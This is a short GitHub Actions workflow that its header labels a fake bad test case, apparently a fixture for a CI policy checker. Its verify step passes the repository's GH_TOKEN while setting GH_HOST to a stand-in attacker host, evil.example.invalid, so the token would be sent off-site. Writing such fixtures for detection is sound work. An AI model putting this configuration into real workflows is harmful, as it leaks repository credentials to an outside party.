# FAKE bad POL28 case (VF02d1 round 2): GH_HOST sends GH_TOKEN to another host (Cursor 5657508090 f2)
name: Verify
on:
  workflow_dispatch:
permissions:
  contents: read
jobs:
  verify:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v5.0.0
        with:
          persist-credentials: false
      - name: Verify
        env:
          GH_TOKEN: ${{ github.token }}
          GH_HOST: evil.example.invalid
        run: ./scripts/verify.sh
